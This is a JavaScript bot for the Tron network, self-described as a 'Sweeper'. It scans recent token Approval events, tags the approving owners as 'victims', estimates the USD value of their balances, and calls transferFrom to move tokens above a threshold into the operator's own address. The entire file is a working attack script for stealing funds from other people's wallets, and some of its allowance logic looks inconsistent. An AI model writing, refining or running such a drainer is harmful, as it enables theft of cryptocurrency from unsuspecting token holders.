import "dotenv/config";
import TronWeb from "tronweb";
import axios from "axios";
import { ERC20_ABI, ROUTER_ABI } from "./abi.js";
import { USDT, WTRX, ROUTER, USDT_DECIMALS } from "./config.js";

// Prevent unexpected background crashes
process.on("unhandledRejection", (reason) => {
  console.error("[Unhandled Rejection]", reason);
});
process.on("uncaughtException", (error) => {
  console.error("[Uncaught Exception]", error);
});

const {
  TRON_PRIVATE_KEY, 
  MY_ADDRESS,
  TRONGRID_API_KEY = "",
  THRESHOLD_USD = "1000",
  SCAN_INTERVAL_MS = "15000",
  MAX_BLOCK_LOOKBACK = "40",
  DRY_RUN = "false"
} = process.env;

if (!TRON_PRIVATE_KEY || !MY_ADDRESS) {
  console.error("Missing TRON_PRIVATE_KEY or MY_ADDRESS in env");
  process.exit(1);
}

const tronWebOptions = {
  fullHost: "https://api.trongrid.io",
  privateKey: TRON_PRIVATE_KEY
};

if (TRONGRID_API_KEY) {
  tronWebOptions.headers = { "TRON-PRO-API-KEY": TRONGRID_API_KEY };
}

const tronWeb = new TronWeb(tronWebOptions);
const MY = tronWeb.address.toHex(MY_ADDRESS);
const axiosHeaders = TRONGRID_API_KEY ? { "TRON-PRO-API-KEY": TRONGRID_API_KEY } : {};

const seenVictimContract = new Set();
const busy = new Set();
const decCache = new Map();

// ---- USD pricing (cached 60s) ----
let priceCache = { t: 0, v: 0 };
async function usdtPerUnitOf(tokenHex) {
  if (tokenHex === USDT) return 1;
  const now = Date.now();
  if (now - priceCache.t < 60_000) return priceCache.v;
  try {
    const router = await tronWeb.contract(ROUTER_ABI, ROUTER);
    const one = 10n ** BigInt(await dec(tokenHex));
    const amounts = await router.getAmountsOut(one.toString(), [tokenHex, WTRX, USDT]).call();
    const usd = Number(amounts[2]) / 10 ** USDT_DECIMALS;
    priceCache = { t: now, v: usd };
    return usd;
  } catch { return 0; }
}

async function dec(tokenHex) {
  if (decCache.has(tokenHex)) return decCache.get(tokenHex);
  let d = 6;
  try { 
    d = Number(await (await tronWeb.contract(ERC20_ABI, tokenHex)).decimals().call()); 
  } catch { 
    d = 6; 
  }
  decCache.set(tokenHex, d);
  return d;
}

// ---- Victim discovery ----
async function recentApprovals(contractHex, fromBlock, toBlock) {
  const url = `https://api.trongrid.io/v1/contracts/${tronWeb.address.fromHex(contractHex)}/events?event_name=Approval&min_block_timestamp=${fromBlock}&max_block_timestamp=${toBlock}&limit=200`;
  try {
    const { data } = await axios.get(url, { headers: axiosHeaders, timeout: 8000 });
    return (data?.data || []).map(e => e.result?.owner && tronWeb.address.toHex(e.result.owner)).filter(Boolean);
  } catch { return []; }
}

// ---- Core check ----
async function checkPair(victimHex, contractHex) {
  const key = `${victimHex}:${contractHex}`;
  if (seenVictimContract.has(key)) return;
  seenVictimContract.add(key);
  if (busy.has(contractHex)) return;
  busy.add(contractHex);

  try {
    const token = await tronWeb.contract(ERC20_ABI, contractHex);
    const bal = BigInt(await token.balanceOf(victimHex).call());
    if (bal === 0n) return;

    const allow = BigInt(await token.allowance(victimHex, contractHex).call());
    if (allow < bal) return;

    const decimals = await dec(contractHex);
    const price = await usdtPerUnitOf(contractHex);
    const usdValue = (Number(bal) / 10 ** decimals) * price;
    if (usdValue < Number(THRESHOLD_USD)) return;

    const ok = await canCallTransferFrom(contractHex, victimHex, bal);
    if (!ok) return;

    console.log(`[HIT] ${tronWeb.address.fromHex(contractHex)} can pull ${usdValue.toFixed(2)} USD from ${tronWeb.address.fromHex(victimHex)}`);
    if (DRY_RUN === "true") return;

    await sweep(contractHex, victimHex, bal);
  } catch (e) {
    // Non-fatal per-pair error
  } finally {
    busy.delete(contractHex);
  }
}

async function canCallTransferFrom(contractHex, victimHex, amount) {
  try {
    const c = await tronWeb.contract(ERC20_ABI, contractHex);
    await c.transferFrom(victimHex, MY, amount.toString()).call({ from: MY });
    return true;
  } catch {
    return false;
  }
}

async function sweep(contractHex, victimHex, amount) {
  try {
    const c = await tronWeb.contract(ERC20_ABI, contractHex);
    const tx = await c.transferFrom(victimHex, MY, amount.toString()).send({ feeLimit: 150_000_000 });
    console.log(`[SWEEP] txid=${tx}`);
  } catch (e) {
    console.error(`[SWEEP FAIL] ${tronWeb.address.fromHex(contractHex)}`, e?.message || e);
  }
}

async function tick() {
  try {
    const now = await tronWeb.trx.getCurrentBlock();
    if (!now || !now.block_header) return;
    const head = now.block_header.raw_data.number;
    const ts = now.block_header.raw_data.timestamp;
    const fromTs = ts - Number(MAX_BLOCK_LOOKBACK) * 3000;

    const contracts = new Set();
    const url = `https://api.trongrid.io/v1/events?event_name=Approval&min_block_timestamp=${fromTs}&max_block_timestamp=${ts}&limit=200`;
    try {
      const { data } = await axios.get(url, { headers: axiosHeaders, timeout: 8000 });
      for (const e of data?.data || []) {
        if (e.contract_address) contracts.add(tronWeb.address.toHex(e.contract_address));
      }
    } catch {}

    for (const contractHex of contracts) {
      const victims = await recentApprovals(contractHex, fromTs, ts);
      for (const v of victims) {
        await checkPair(v, contractHex);
      }
    }

    console.log(`[tick] head=${head} contracts=${contracts.size}`);
  } catch (e) {
    console.error("[tick error]", e?.message || e);
  }
}

async function main() {
  console.log(`Sweeper started -> ${MY_ADDRESS} | threshold=$${THRESHOLD_USD} | dryRun=${DRY_RUN}`);
  await tick();
  setInterval(tick, Number(SCAN_INTERVAL_MS));
}

main();
